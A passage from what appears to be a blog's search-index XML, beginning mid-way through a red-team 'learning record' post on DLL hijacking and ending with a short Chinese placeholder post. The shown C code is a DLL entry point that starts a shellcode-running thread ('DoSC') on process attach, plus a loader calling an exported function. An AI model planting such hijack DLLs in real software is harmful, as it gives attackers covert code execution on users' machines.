(ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);break;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/DLL%20hijacking%20from%20hijacking%20to%20on-line/4.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近太忙了，等过两天有空了开始更新！</title>
      <link href="2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/"/>
      <url>2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="博客暂未完全调试好，敬请期待"><a href="#博客暂未完全调试好，敬请期待" class="headerlink" title="博客暂未完全调试好，敬请期待"></a>博客暂未完全调试好，敬请期待</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
